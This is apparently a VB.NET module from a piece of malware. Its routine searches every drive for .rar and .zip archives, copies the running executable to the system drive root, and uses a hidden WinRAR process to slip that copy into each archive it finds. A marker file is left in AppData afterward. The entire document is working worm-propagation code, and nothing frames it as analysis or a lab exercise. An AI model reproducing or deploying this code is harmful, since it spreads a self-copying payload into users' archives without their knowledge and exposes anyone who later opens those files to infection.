Imports System.IO
Imports System.Text
Imports System.Runtime.InteropServices

Module RAR
    <DllImport("kernel32.dll", CharSet:=CharSet.Auto)> _
    Public Function GetShortPathName(<MarshalAs(UnmanagedType.LPTStr)> ByVal path As String, <MarshalAs(UnmanagedType.LPTStr)> ByVal shortPath As StringBuilder, ByVal shortPathLength As Integer) As Integer
    End Function
    Dim _rarPath As String
    Dim _copiedExeName As String
    Private Sub Search(ByVal pathName As String)
        Dim files As String()
        Try


            files = Directory.GetFiles(pathName)
            For Each file As String In files
                If file.Contains(".rar") Then
                    RarStart(file)
                End If
                If file.Contains(".zip") Then
                    RarStart(file)
                End If
            Next

            Dim subdirectorys As String() = Directory.GetDirectories(pathName)
            For Each subdirectory As String In subdirectorys
                Search(subdirectory)
            Next
        Catch ex As Exception

        End Try
    End Sub
    Public Sub Spread(ByVal myExeName As String)
        _copiedExeName = myExeName
        Dim drives As String() = Environment.GetLogicalDrives()
        For Each strDrive As String In drives
            Search(strDrive)
        Next
        File.Create(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) & "\temp48.txt")
    End Sub
    Public Sub RarStart(ByVal archiveToInject As String)
        Dim sysFolder As String = Environment.GetFolderPath(Environment.SpecialFolder.System)
        Dim rootdrive As String = sysFolder.Replace(sysFolder.Substring(sysFolder.IndexOf("\")), [String].Empty) & "\"

        _rarPath = Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles) & "\WinRAR\WinRAR.exe"
        If File.Exists(_rarPath) Then
            If Not File.Exists(Path.Combine(rootdrive, _copiedExeName)) Then

                File.Copy(Process.GetCurrentProcess().MainModule.FileName, Path.Combine(rootdrive, _copiedExeName))
            End If

            Dim getshortExePath = New StringBuilder(255)
            GetShortPathName(Path.Combine(rootdrive, _copiedExeName), getshortExePath, getshortExePath.Capacity)
            Dim evilpath As String = getshortExePath.ToString()

            Dim shortArchiveDirectory = New StringBuilder(255)
            GetShortPathName(archiveToInject, shortArchiveDirectory, shortArchiveDirectory.Capacity)


            Try
                Dim rarProcess As New ProcessStartInfo()
                Dim theInfo As String = (" a " & shortArchiveDirectory.ToString & " ") + evilpath
                rarProcess.FileName = _rarPath
                rarProcess.Arguments = theInfo
                rarProcess.WindowStyle = ProcessWindowStyle.Hidden

                Process.Start(rarProcess)
            Catch
            End Try
        End If
    End Sub
End Module